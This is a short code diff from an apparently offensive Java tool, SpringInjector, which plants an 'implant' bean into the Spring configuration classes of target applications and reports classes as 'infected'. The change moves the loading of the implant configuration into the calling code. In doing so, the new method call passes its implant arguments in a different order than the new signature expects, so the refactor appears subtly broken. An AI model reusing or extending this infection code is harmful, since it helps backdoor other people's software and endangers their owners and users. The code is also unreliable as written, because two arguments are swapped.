@@ -66,7 +66,8 @@ public class SpringInjector {
                          */
                         System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
 
-                        if (!addBeanToSpringConfig(currentlyProcessing, implantComponent)) {
+                        ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
+                        if (!addBeanToSpringConfig(currentlyProcessing, implantComponent, implantSpringConfig)) {
                             System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
                             entry.forward();
                             continue;
@@ -92,8 +93,7 @@ public class SpringInjector {
         return didInfect;
     }
 
-    private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
-        ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
+    private static boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) throws ClassNotFoundException {
         String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
         String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
         String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
